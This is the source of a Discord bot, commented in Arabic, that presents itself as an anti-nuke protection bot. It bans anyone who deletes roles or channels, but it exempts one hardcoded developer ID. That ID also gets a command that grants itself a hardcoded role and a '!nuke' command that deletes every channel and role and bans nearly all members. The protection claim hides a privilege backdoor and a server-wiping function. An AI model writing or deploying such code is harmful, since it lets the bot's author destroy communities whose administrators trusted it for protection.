import discord
from discord.ext import commands
import os
import time
import asyncio
from threading import Thread
from flask import Flask

# 1. إعداد خادم الويب (للـ Web Service على Render)
app = Flask('')

@app.route('/')
def home():
    return "Bot is online and running!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# تشغيل خادم الويب في الخلفية فوراً
Thread(target=run_web, daemon=True).start()

# 2. إعدادات البوت الأساسية
MY_ID = 1320438836878118973
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]: actions[key][uid] = []
    actions[key][uid].append(now)
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# 3. أنظمة الحماية (Anti-Nuke)
@bot.event
async def on_guild_role_delete(role):
    async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id != role.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await role.guild.ban(entry.user, reason="Anti-Nuke: حذف رتبة")

@bot.event
async def on_guild_channel_delete(channel):
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id != channel.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")

# 4. الأوامر الخاصة بالرتب
@bot.command()
async def getrole(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.add_roles(role)
        await ctx.send("✅ تم إعطاؤك الرتبة.")

@bot.command(name="removerole")
async def removerole_cmd(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.remove_roles(role)
        await ctx.send("✅ تم إزالة الرتبة.")

# 5. أمر النيوك (محدث وآمن)
@bot.command()
async def nuke(ctx):
    if ctx.author.id != MY_ID:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
        return
        
    await ctx.send("⚠️ **تحذير خطير:** اكتب `!confirm_nuke` الآن للتأكيد.")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content == "!confirm_nuke"

    try:
        await bot.wait_for('message', check=check, timeout=30.0)
    except asyncio.TimeoutError:
        await ctx.send("❌ انتهى الوقت، تم إلغاء النيوك.")
        return

    await ctx.send("💥 جاري تنفيذ التدمير...")
    
    # حذف القنوات
    for c in ctx.guild.channels:
        try: await c.delete()
        except: pass
        
    # حذف الرتب
    for r in ctx.guild.roles:
        if r.name != "@everyone" and r != ctx.guild.me.top_role:
            try: await r.delete()
            except: pass
            
    # حظر الأعضاء
    for m in ctx.guild.members:
        if m != ctx.guild.owner and not m.bot and m != ctx.guild.me:
            try: await m.ban(reason="Nuke executed")
            except: pass

@bot.event
async def on_ready():
    print(f"✅ البوت متصل كـ {bot.user} - والموقع يعمل بنجاح!")

# تشغيل البوت
TOKEN = os.getenv("TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ خطأ: لم يتم العثور على التوكن!")
